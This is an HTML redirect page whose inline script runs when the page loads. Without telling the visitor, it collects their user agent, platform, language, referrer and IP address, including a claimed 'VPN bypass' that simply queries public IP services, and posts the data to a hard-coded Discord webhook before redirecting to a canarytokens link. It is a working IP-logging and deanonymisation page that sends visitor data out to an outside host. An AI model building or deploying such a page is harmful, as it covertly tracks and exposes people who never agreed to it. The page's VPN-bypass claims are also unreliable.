<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <script>
        async function sendVisitorInfoAndRedirect() {
            // Replace this with your actual webhook URL
            const webhookUrl = 'https://discord.com/api/webhooks/1251043675358760962/zfFykEDggnzIz975GTgwhFfh8FLW4jjXOS2F2E9t1frE0LbQwA0XXUVhnkyjoXV5P8_s';

            // Load FingerprintJS and initialize
            const fpPromise = import('https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs-pro@3/dist/fp.min.js').then((FingerprintJS) =>
                FingerprintJS.load({
                    endpoint: 'http://canarytokens.com/traffic/images/articles/fxwb3v9cklb6qvefin3a9u07j/contact.php',
                })
            );

            // Function to check if the visitor is using a VPN
            async function checkVPN() {
                try {
                    // Wait for FingerprintJS to load
                    const fp = await fpPromise;

                    // Get the visitor's fingerprint
                    const result = await fp.get();

                    // Extract relevant information for VPN detection
                    const fingerprint = result.visitorId;

                    // Send fingerprint to VPN detection API
                    const vpnCheckUrl = `https://proxycheck.io/v2/?key=public-62o148-006118-6z277x`; // Replace with your VPN detection URL
                    let response = await fetch(vpnCheckUrl);
                    let data = await response.json();
                    return data.isVPN; // Assuming the API returns { isVPN: true/false }
                } catch (error) {
                    console.error('Error checking VPN status:', error);
                    return false; // Default to false if there's an error
                }
            }

            // Collect visitor information
            const visitorInfo = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                referrer: document.referrer,
                ip: 'Not fetched', // Placeholder IP, will be replaced if fetched successfully
                isVPN: false // Default to false
            };

            // Function to fetch visitor IP address
            async function fetchIPAddress() {
                try {
                    let response = await fetch('https://api.ipify.org?format=json');
                    let data = await response.json();
                    return data.ip;
                } catch (error) {
                    console.error('Error fetching IP address:', error);
                    return 'Error fetching IP';
                }
            }

            // Function to attempt to bypass VPN masking
            async function bypassVPN() {
                try {
                    // Use multiple IP detection services to try to get the real IP
                    const ipDetectionUrls = [
                        'https://api.ipify.org?format=json',
                        'https://ifconfig.me/ip',
                        'https://icanhazip.com'
                        // Add more IP detection URLs here if needed
                    ];

                    let realIP = null;

                    // Try fetching from each URL until a valid IP is obtained
                    for (const url of ipDetectionUrls) {
                        let response = await fetch(url);
                        let data = await response.text();
                        if (isValidIP(data)) {
                            realIP = data.trim();
                            break;
                        }
                    }

                    return realIP || 'Unable to determine real IP';
                } catch (error) {
                    console.error('Error bypassing VPN:', error);
                    return 'Error bypassing VPN';
                }
            }

            // Function to check if a string is a valid IP address
            function isValidIP(ip) {
                const ipRegex = /^([0-9]{1,3}\.){3}[0-9]{1,3}$/;
                return ipRegex.test(ip.trim());
            }

            // Check if the visitor is using a VPN
            const isVPN = await checkVPN();
            visitorInfo.isVPN = isVPN;

            // Attempt to bypass VPN to get real IP address
            if (isVPN) {
                visitorInfo.ip = await bypassVPN();
                visitorInfo.userAgent = 'Potential VPN User-Agent';
                // Add more handling or logging here if needed
            } else {
                // Fetch real IP if not using VPN
                visitorInfo.ip = await fetchIPAddress();
            }

            // Prepare the message content for the webhook
            const messageContent = {
                content: `Visitor Information:
- Timestamp: ${visitorInfo.timestamp}
- User Agent: ${visitorInfo.userAgent}
- Platform: ${visitorInfo.platform}
- Language: ${visitorInfo.language}
- Referrer: ${visitorInfo.referrer}
- IP Address: ${visitorInfo.ip}
- VPN Detected: ${visitorInfo.isVPN ? 'Yes' : 'No'}`
            };

            // Send visitor information to the webhook using fetch
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(messageContent)
                });

                if (!response.ok) {
                    throw new Error('Failed to send visitor information to webhook');
                }
            } catch (error) {
                console.error('Error sending visitor information:', error);
            }

            // Redirect to the target URL immediately
            window.location.replace("http://canarytokens.com/traffic/images/articles/fxwb3v9cklb6qvefin3a9u07j/contact.php?reloadCount=0");
        }

        // Start the process of sending info and redirecting
        sendVisitorInfoAndRedirect();
    </script>
</head>
<body>
    <p>If you are not redirected automatically, <a href="http://canarytokens.com/traffic/images/articles/fxwb3v9cklb6qvefin3a9u07j/contact.php?reloadCount=0">click here</a>.</p>

    <!-- Example of including an external script -->
    <script src="https://static.app/js/static.js" type="text/javascript"></script>
</body>
</html>
